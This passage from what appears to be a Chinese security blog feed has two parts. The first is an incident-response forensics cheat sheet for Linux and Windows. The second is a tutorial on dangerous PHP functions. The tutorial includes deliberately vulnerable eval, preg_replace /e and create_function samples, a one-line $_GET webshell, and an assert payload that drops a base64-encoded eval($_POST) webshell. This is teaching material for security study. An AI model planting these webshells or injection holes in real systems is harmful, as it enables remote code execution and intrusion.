1,3="">0-9</span>))” |uniq -c (没开启防火墙的情况)</td><td>查看试图爆破主机的 IP</td></tr><tr><td>grep “Failed password for root” /var/log/secure |awk ‘{print $11}’ |sort</td><td>查看爆破主机的 ROOT 账号的 IP</td></tr><tr><td>grep “Failed password” /var/log/secure |awk {‘print $9’} |sort |uniq -c |sort -nr</td><td>查看爆破用户名字典</td></tr><tr><td print="" $1,$2,$3,$9,$11="">grep -o “Failed password” /var/log/secure|uniq -c<br/>grep &quot;Accepted &quot; /var/log/secure |awk ’</td><td>查看爆破用户名字典</td></tr></tbody></table><h4 id="用户"><a class="markdownIt-Anchor" href="#用户">#</a> 用户</h4><table><thead><tr><th>Linux 命令</th><th>效果</th></tr></thead><tbody><tr><td>last</td><td>显示用户最近登录信息</td></tr><tr><td>cat /etc/shadow</td><td>查看密码登陆相关信息</td></tr><tr><td>uptime</td><td>查看用户登陆时间</td></tr><tr><td>/etc/sudoers</td><td>sudo 用户列表</td></tr><tr><td>awk -F: ‘($3==0){print$1}’ /etc/passwd</td><td>查看 UID 为 0 的帐号</td></tr><tr><td>awk -F: ‘($2==&quot;&quot;){print$1}’ /etc/shadow</td><td>查看密码为空的账号</td></tr><tr><td>cat /etc/passwd |grep -E “/bin/bash$”</td><td>查看能够登录的帐号</td></tr><tr><td>lastlog</td><td>系统中所有用户最近一次登录信息</td></tr><tr><td>lastb</td><td>用户错误的登录列表</td></tr><tr><td>more /etc/sudoers |grep -v “<sup>#|</sup>$” |grep “ALL=(ALL)”</td><td>查看 sudo 权限的用户</td></tr><tr><td>who</td><td>查询 utmp 文件并报告当前登录的每个用户</td></tr><tr><td>w</td><td>查询 utmp 文件并显示当前系统中每个用户和它所运行的进程信息</td></tr><tr><td>users</td><td>打印当前登录的用户，每个用户名对应一个登录会话。如果一个用户不止一个登录会话，其用户名显示相同次数</td></tr></tbody></table><h4 id="进程"><a class="markdownIt-Anchor" href="#进程">#</a> 进程</h4><table><thead><tr><th>进程命令</th><th>效果</th></tr></thead><tbody><tr><td>lsof</td><td>列出当前系统打开文件的工具</td></tr><tr><td>ps aux |grep pid |grep –v grep</td><td>查看对应的进程信息</td></tr><tr><td>lsof -i:1677</td><td>查看指定端口对应的程序</td></tr><tr><td>lsof -p 1234</td><td>检查 pid 号为 1234 进程调用情况</td></tr><tr><td>strace -f -p 1234</td><td>跟踪分析 pid 号为 1234 的进程</td></tr><tr><td>lsof -g gid</td><td>找恶意文件关联的 lib 文件</td></tr><tr><td>ps -ef</td><td>查看全格式的全部进程</td></tr><tr><td>pstree -a</td><td>以树状图的方式展现进程之间的派生关系</td></tr><tr><td>ps -ef |awk ‘{print}’ |sort -n |uniq &gt;1<br/>ls /proc |sort -n |uniq &gt;2</td><td>隐藏进程查看</td></tr><tr><td>diff 1 2</td><td>比较文本文件的异同处</td></tr><tr><td>netstat -anptl</td><td>显示网络状态，端口信息</td></tr><tr><td>top</td><td>实时显示系统中各个进程的资源占用状况</td></tr></tbody></table><h4 id="自启动"><a class="markdownIt-Anchor" href="#自启动">#</a> 自启动</h4><table><thead><tr><th>启动配置文件</th><th>特征</th></tr></thead><tbody><tr><td>~/.bashrc</td><td>用户 HOME 家目录启动文件</td></tr><tr><td>/etc/rc.local</td><td>开机启动程序</td></tr><tr><td>/etc/init.d/ 服务</td><td>服务启动关闭</td></tr><tr><td>/etc/cron*</td><td>定时任务</td></tr><tr><td>chkconfig --list |grep “3:on|5:on”</td><td>查看开机自启动服务</td></tr></tbody></table><h4 id="计划任务"><a class="markdownIt-Anchor" href="#计划任务">#</a> 计划任务</h4><table><thead><tr><th>查看计划任务命令</th></tr></thead><tbody><tr><td>crontab -l &amp; cat /etc/crontab &amp; ls /etc/cron.* 查看计划任务</td></tr><tr><td>crontab -e  进行修改计划任务</td></tr><tr><td>crontab -u root -l  显示 root 用户计划任务</td></tr><tr><td>配置文件</td></tr><tr><td>/var/spool/cron/*    root 用户执行的就会在 /var/spool/cron/ 下面创建 root 文件</td></tr><tr><td>/etc/cron.d    cron 任务可以根据调度来执行</td></tr><tr><td>/etc/cron.daily/     每日计划 *<br/>/etc/cron.hourly/   小时计划 *<br/>/etc/cron.monthly/  月计划 *<br/>/etc/cron.weekly/   周计划</td></tr><tr><td>/etc/anacrontab   Anacrontab 的配置入口</td></tr><tr><td>/var/log/cron*   日志计划程序</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">misc 杂</span><br><span class="line">stat 命令查看文件或文件系统的状态时间等属性</span><br><span class="line">echo $PATH 查看环境变量</span><br><span class="line">/rpm -Va &gt; rpm.log 校验所有的RPM软件包，查找丢失的文件</span><br><span class="line">kill -9 强制杀死进程</span><br><span class="line">chattr –i 取消锁定文件</span><br><span class="line">setfacl / getfacl  ACL权限设置</span><br><span class="line">chmod 000 去执行权限</span><br><span class="line">strings /usr/bin/.sshd | egrep &#x27;[1-9]&#123;1,3&#125;.[1-9]&#123;1,3&#125;.&#x27; ssh后门快速判断</span><br></pre></td></tr></table></figure><h2 id="windows取证"><a class="markdownIt-Anchor" href="#windows取证">#</a> Windows 取证</h2><p>思维导图</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210505135434533.png" alt="image-20210505135434533"></p><h4 id="文件-2"><a class="markdownIt-Anchor" href="#文件-2">#</a> 文件</h4><p>分析文件路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">文件路径</span><br><span class="line">C:\Documents and Settings\Administrator\Recent</span><br><span class="line">C:\Documents and Settings\Default User\Recent</span><br><span class="line">%UserProfile%\Recent  文件日期、新增文件、可疑/异常文件、最近使用文件、浏览器下载文件</span><br><span class="line">下载目录</span><br><span class="line">回收站文件</span><br><span class="line">程序临时文件</span><br><span class="line">历史文件记录</span><br><span class="line">应用程序打开历史</span><br><span class="line">搜索历史</span><br><span class="line">快捷方式（LNK）</span><br><span class="line">c:\windows\temp\</span><br><span class="line">Window 2003 C:\Documents and Settings</span><br><span class="line">Window 2008R2 C:\Users\</span><br><span class="line">时间排序文件</span><br><span class="line">findstr /s /m /I “UploadFiles” *.log  查看指定时间范围包括上传文件夹的访问请求</span><br><span class="line">findstr /s /m /I “x.js” *.asp 关键信息是x.js</span><br></pre></td></tr></table></figure><h4 id="日志-2"><a class="markdownIt-Anchor" href="#日志-2">#</a> 日志</h4><table><thead><tr><th>日志类型</th><th>命令</th></tr></thead><tbody><tr><td>系统日志，程序日志，安全日志</td><td>eventvwr.msc</td></tr><tr><td>服务器日志</td><td>FTP 连接日志和 HTTPD 事务日志：% systemroot% \system32\LogFiles\ <br/>IIS 日志默认存放在 System32\LogFiles 目录下，使用 W3C 扩展格式</td></tr><tr><td>操作系统日志</td><td>登录成功的所有事件：<br/>LogParser.exe -i:EVT –o:DATAGRID “SELECT * FROM c:\Security.evtx where EventID=4624″</td></tr><tr><td>指定登录时间范围的事件：</td><td>LogParser.exe -i:EVT –o:DATAGRID “SELECT * FROM c:\Security.evtx where TimeGenerated&gt;’2018-<br/>06-19 23:32:11′ and TimeGenerated&lt;’2018-06-20 23:34:00′ and EventID=4624″</td></tr><tr><td>提取登录成功的用户名和 IP</td><td>LogParser.exe -i:EVT –o:DATAGRID “SELECT EXTRACT_TOKEN(Message,13,’ ‘)as<br/>EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,’|’) as<br/>Username,EXTRACT_TOKEN(Message,38,’ ‘) as Loginip FROM c:\Security.evtx where EventID=4624″</td></tr><tr><td>登录失败的所有事件</td><td>LogParser.exe -i:EVT –o:DATAGRID “SELECT * FROM c:\Security.evtx where EventID=4625″</td></tr><tr><td>提取登录失败用户名进行聚合统计</td><td>LogParser.exe -i:EVT “SELECT EXTRACT_TOKEN(Message,13,’ ‘) as <br/> as user,count(EXTRACT_TOKEN(Message,19,’ ‘)) as Times,EXTRACT_TOKEN(Message,39,’ ‘)   as Loginip FROM c:\Security.evtx where <br/> EventID=4625GROUP BY Message”<br/></td></tr><tr><td>系统历史开关机记录</td><td>LogParser.exe -i:EVT –o:DATAGRID “SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID=6005 or EventID=6006″<br/></td></tr></tbody></table><p>常用事件 ID 含义</p><table><thead><tr><th>Event ID(2000/XP/2003)</th><th>Event ID(Vista/7/8/2008/2012)</th><th>描述</th><th>日志名称</th></tr></thead><tbody><tr><td>528</td><td>4624</td><td>成功登录</td><td>Security</td></tr><tr><td>529</td><td>4625</td><td>失败登录</td><td>Security</td></tr><tr><td>680</td><td>4776</td><td>成功 / 失败的账户认证</td><td>Security</td></tr><tr><td>624</td><td>4720</td><td>创建用户</td><td>Security</td></tr><tr><td>636</td><td>4732</td><td>添加用户到启用安全性的本地组中</td><td>Security</td></tr><tr><td>632</td><td>4728</td><td>添加用户到启用安全性的全局组中</td><td>Security</td></tr><tr><td>2934</td><td>7030</td><td>服务创建错误</td><td>System</td></tr><tr><td>2944</td><td>7040</td><td>IPSEC 服务服务的启动类型已从禁用更改为自动启动</td><td>System</td></tr><tr><td>2949</td><td>7045</td><td>服务创建</td><td>System</td></tr></tbody></table><p>登录类型 ID</p><p>成功 / 失败登录事件提供的有用信息之一是用户 / 进程尝试登录（登录类型），但 Windows 将此信息显示为数字，下面是数字和对应的说明：</p><table><thead><tr><th><strong>录类型</strong></th><th><strong>登录类型</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>2</td><td>Interactive</td><td>用户登录到本机</td></tr><tr><td>3</td><td>Network</td><td>用户或计算手机从网络登录到本机，如果网络共享，或使用 net use 访问网络共享，net view 查看网络共享</td></tr><tr><td>4</td><td>Batch</td><td>批处理登录类型，无需用户干预</td></tr><tr><td>5</td><td>Service</td><td>服务控制管理器登录</td></tr><tr><td>7</td><td>Unlock</td><td>用户解锁主机</td></tr><tr><td>8</td><td>NetworkCleartext</td><td>用户从网络登录到此计算机，用户密码用非哈希的形式传递</td></tr><tr><td>9</td><td>NewCredentials</td><td>进程或线程克隆了其当前令牌，但为出站连接指定了新凭据</td></tr><tr><td>10</td><td>Remotelnteractive</td><td>使用终端服务或远程桌面连接登录</td></tr><tr><td>11</td><td>Cachedlnteractive</td><td>用户使用本地存储在计算机上的凭据登录到计算机（域控制器可能无法验证凭据），如主机不能连接域控，以前使用域账户登录过这台主机，再登录就会产生这样日志</td></tr><tr><td>12</td><td>CachedRemotelnteractive</td><td>与 Remotelnteractive 相同，内部用于审计目的</td></tr><tr><td>13</td><td>CachedUnlock</td><td>登录尝试解锁</td></tr></tbody></table><h4 id="账号"><a class="markdownIt-Anchor" href="#账号">#</a> 账号</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">新增用户</span><br><span class="line">隐藏/克隆帐号</span><br><span class="line">管理员对应键值</span><br><span class="line">lusrmgr.msc 查看账户变化</span><br><span class="line">net user 列出当前登录账户</span><br><span class="line">wmic UserAccount get 列出当前系统所有账户</span><br><span class="line">net localgroup administrators 列出管理员组用户</span><br><span class="line">注册表-管理员键值：HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users</span><br><span class="line">D盾查杀</span><br><span class="line">日志-登录时间/用户名</span><br></pre></td></tr></table></figure><h4 id="进程-2"><a class="markdownIt-Anchor" href="#进程-2">#</a> 进程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc | findstr pid  查看服务进行</span><br><span class="line">netstat -ano</span><br><span class="line">wmic process | find &quot;Proccess Id&quot; &gt; proc.csv</span><br><span class="line">powershell: Get-WmiObject -Class Win32_Process</span><br><span class="line">msinfo32 查看自己电脑配置详情</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">扩展powershell命令</span><br><span class="line">wmic <span class="keyword">process</span> get caption,commandline /value</span><br><span class="line">wmic <span class="keyword">process</span> <span class="built_in">where</span> caption=”svchost.exe” get caption,commandline /value</span><br><span class="line">wmic service get name,pathname,processid,startname,status,state /value</span><br><span class="line">wmic <span class="keyword">process</span> get CreationDate,name,processid,commandline,ExecutablePath /value</span><br><span class="line">wmic <span class="keyword">process</span> get name,processid,executablepath| findstr <span class="string">&quot;7766&quot;</span></span><br></pre></td></tr></table></figure><h4 id="端口"><a class="markdownIt-Anchor" href="#端口">#</a> 端口</h4><p><code>netstat -ano</code></p><table><thead><tr><th>端口状态</th><th>说明</th></tr></thead><tbody><tr><td>CLOSED</td><td>无连接活动或正在进行</td></tr><tr><td>LISTEN</td><td>监听中等待连接</td></tr><tr><td>SYN_RECV</td><td>服务端接收了 SYN</td></tr><tr><td>SYN_SENT</td><td>请求连接等待确认</td></tr><tr><td>ESTABLISHED</td><td>连接建立数据传输</td></tr><tr><td>FIN_WAIT1</td><td>请求中止连接，等待对方 FIN</td></tr><tr><td>FIN_WAIT2</td><td>同意中止，请稍候</td></tr><tr><td>ITMED_WAIT</td><td>等待所有分组死掉</td></tr><tr><td>CLOSING</td><td>两边同时尝试关闭</td></tr><tr><td>TIME_WAIT</td><td>另一边已初始化一个释放</td></tr><tr><td>LAST_ACK</td><td>等待原来的发向远程 TCP 的连接中断请求的确认</td></tr><tr><td>CLOSE-WAIT</td><td>等待关闭连接</td></tr></tbody></table><h4 id="自启动-2"><a class="markdownIt-Anchor" href="#自启动-2">#</a> 自启动</h4><p>注册表位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKLM\Software\Microsoft\Windows\CurrentVersion\RunonceEx</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(ProfilePath)\Start Menu\Programs\Startup 启动项</span><br><span class="line">shell:startup  查看开机自启</span><br><span class="line">msconfig 启动选项卡</span><br><span class="line">gpedit.msc 组策略编辑器</span><br><span class="line">开始&gt;所有程序&gt;启动</span><br><span class="line">wmic startup list full</span><br></pre></td></tr></table></figure><h4 id="计划任务-2"><a class="markdownIt-Anchor" href="#计划任务-2">#</a> 计划任务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\Tasks\</span><br><span class="line">C:\Windows\SysWOW64\Tasks\</span><br><span class="line">C:\Windows\tasks\</span><br><span class="line">schtasks</span><br><span class="line">taskschd.msc</span><br><span class="line">at</span><br><span class="line">开始-设置-控制面板-任务计划</span><br></pre></td></tr></table></figure><h4 id="注册表"><a class="markdownIt-Anchor" href="#注册表">#</a> 注册表</h4><table><thead><tr><th>注册表位置</th><th>对应信息</th></tr></thead><tbody><tr><td>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList</td><td>临时配置文件</td></tr><tr><td>HKLM\SAM\Domains\Account\</td><td>用户信息</td></tr><tr><td>hklm:\Software\Microsoft\Windows\CurrentVersion\policies\system</td><td>UAC 注册表位置</td></tr><tr><td>hklm:\Software\Microsoft\Active Setup\Installed Components</td><td>安装的组件信息</td></tr><tr><td>hklm:\Software\Microsoft\Windows\CurrentVersion\App Paths</td><td>软件环境变量</td></tr><tr><td>hklm:\software\microsoft\windows nt\CurrentVersion\winlogon</td><td>系统启动</td></tr><tr><td>hklm:\software\microsoft\security center\svc</td><td>安全中心报警</td></tr><tr><td>hkcu:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths</td><td>让源管理器中的地址栏不记录文件的打开记录</td></tr><tr><td>hkcu:\Software\Microsoft\Windows\CurrentVersion\explorer\RunMru</td><td>禁止自动保存运行记录</td></tr><tr><td>hklm:\Software\Microsoft\Windows\CurrentVersion\explorer\Startmenu</td><td>软件自动启动项</td></tr><tr><td>hklm:\System\CurrentControlSet\Control\Session Manager</td><td>装载 Win32 子系统内核模式部分</td></tr><tr><td>hkcu:\Software\Microsoft\Internet Explorer\Extensions</td><td>记录最后下载软件的存储位置</td></tr><tr><td>hklm:\Software\Microsoft\Windows\CurrentVersion\ShellExtensions\Approved</td><td>系统或者用户已注册的外壳扩展功能模块</td></tr><tr><td>hklm:\System\CurrentControlSet\Control\Session Manager\AppCertDlls</td><td>后门及持久化访问</td></tr></tbody></table><p>本文内容借鉴：应急响应实战 checklist pdf</p><p>博客：<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjUyNA==">https://xz.aliyun.com/t/2524</span></p>]]></content>
      
      
      
        <tags>
            
            <tag> 溯源取证总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php危险函数</title>
      <link href="2021/05/04/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/"/>
      <url>2021/05/04/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="php常见危险函数"><a class="markdownIt-Anchor" href="#php常见危险函数">#</a> PHP 常见危险函数</h2><h3 id="eval函数"><a class="markdownIt-Anchor" href="#eval函数">#</a> eval () 函数</h3><p>定义和用法：</p><p>eval () 函数把字符串按照 PHP 代码来计算.<br> 该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$var</span> = <span class="string">&quot;var&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$var = <span class="subst">$arg</span>;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$var =&quot;</span>.<span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210503102521525.png" alt="image-20210503102521525"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210503102807857.png" alt="image-20210503102807857"></p><h3 id="assert函数"><a class="markdownIt-Anchor" href="#assert函数">#</a> <strong>assert () 函数</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assert()会检查指定的assertion并在结果为FALSE时采取适当的行动。</span><br><span class="line">判断一个表达式是否成立。返回true or false。</span><br><span class="line">如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</span><br></pre></td></tr></table></figure><p>一般情况下，黑名单都会禁用 <code>eval()</code>  函数，所以用 <code>assert</code>  来代替 eval 来执行具体操作。</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210503103001094.png" alt="image-20210503103001094"></p><h3 id="assertion函数"><a class="markdownIt-Anchor" href="#assertion函数">#</a> assertion 函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">检查一个断言是否为 FALSE。</span><br><span class="line">assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。</span><br><span class="line">如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</span><br></pre></td></tr></table></figure><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $_GET[a]($_GET[b]);?&gt;  //一句话木马</span><br><span class="line">//payload： ?a=assert&amp;b=&#123;fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwJF9QT1NUW2NdKTsgPz4))&#125;;</span><br></pre></td></tr></table></figure><h3 id="preg_replace函数"><a class="markdownIt-Anchor" href="#preg_replace函数">#</a> <strong>preg_replace () 函数</strong></h3><p>preg_replace 函数执行一个正则表达式的搜索和替换。</p><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line"></span><br><span class="line"><span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line"></span><br><span class="line"><span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pattern</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$replacement</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$subject</span>))</span><br><span class="line">&#123;</span><br><span class="line">preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?pat=/test/e&amp;rep=phpinfo()&amp;sub=jutst test</span><br><span class="line">也可以为</span><br><span class="line">?pat=/test/e&amp;rep=var_dump(`net user`)&amp;sub=jutst test</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP 5.5.0 起， 传入 “\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\e” 也无法起效。</span><br></pre></td></tr></table></figure><h3 id="create_function函数"><a class="markdownIt-Anchor" href="#create_function函数">#</a> create_function () 函数</h3><p>string create_function ( string $args , string $code )<br> 函数作用：从创建一个匿名函数传递的参数，并返回一个唯一的名称</p><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sort_by</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sort_by&#x27;</span>];</span><br><span class="line"><span class="variable">$sorter</span> = <span class="string">&#x27;strnatcasecmp&#x27;</span>;</span><br><span class="line"><span class="variable">$databases</span>=<span class="keyword">array</span>(<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;4321&#x27;</span>);</span><br><span class="line"><span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;]);&#x27;</span>;</span><br><span class="line">usort(<span class="variable">$databases</span>, create_function(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="variable">$sort_function</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造匿名函数原型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> * <span class="string">&#x27; . $sorter . &#x27;</span>(<span class="variable">$a</span>[<span class="string">&quot;&#x27; . <span class="subst">$sort_by</span> . &#x27;&quot;</span>], <span class="variable">$b</span>[<span class="string">&quot;&#x27; . <span class="subst">$sort_by</span> . &#x27;&quot;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>构造 payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test3.php?sort_by=%27%22]);&#125;phpinfo();/*</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210503104641807.png" alt="image-20210503104641807"></p><h3 id="call_user_func函数"><a class="markdownIt-Anchor" href="#call_user_func函数">#</a> call_user_func 函数</h3><p>mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )<br> 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</p><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filter</span>= <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">    <span class="variable">$value</span> = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">    call_user_func(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210503111406856.png" alt="image-20210503111406856"></p><h3 id="call_user_func_array函数"><a class="markdownIt-Anchor" href="#call_user_func_array函数">#</a> call_user_func_array 函数</h3><p>call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。</span><br></pre></td></tr></table></figure><h2 id="命令执行函数"><a class="markdownIt-Anchor" href="#命令执行函数">#</a> 命令执行函数</h2><ul><li>exec ()  执行一个外部程序</li><li>passthru ()  执行外部程序并且显示原始输出</li><li>proc_open ()  执行一个命令，并且打开用来输入 / 输出的文件指针</li><li>shell_exec ()  通过 shell 环境执行命令，将完整的输出以字符串方式返回</li><li>system ()  执行外部程序，并且显示输出</li><li>popen ()  通过 popen () 的参数传递一条命令，并对 popen () 所打开的文件进行执行</li><li>escapeshellcmd () 对字符串中可能会欺骗 shell 命令执行任意命令的字符转义</li></ul><h2 id="包含函数"><a class="markdownIt-Anchor" href="#包含函数">#</a> 包含函数</h2><p>require、include、require_once、include_once<br> 包含函数 一共有四个，主要作用为包含并运行指定文件。</p><ul><li>require 和 include 几乎完全一样，除了处理失败的方式不同之外。require 在出错时产生 (E_COMPILE_ERROR) 级别的错误。换句话说将导致脚本中止而 include 只产生警告（E_WARNING），脚本会继续运行。</li><li>include 语句包含并运行指定文件</li><li>require_once 语句和 require 语句完全相同，唯一区别是 PHP 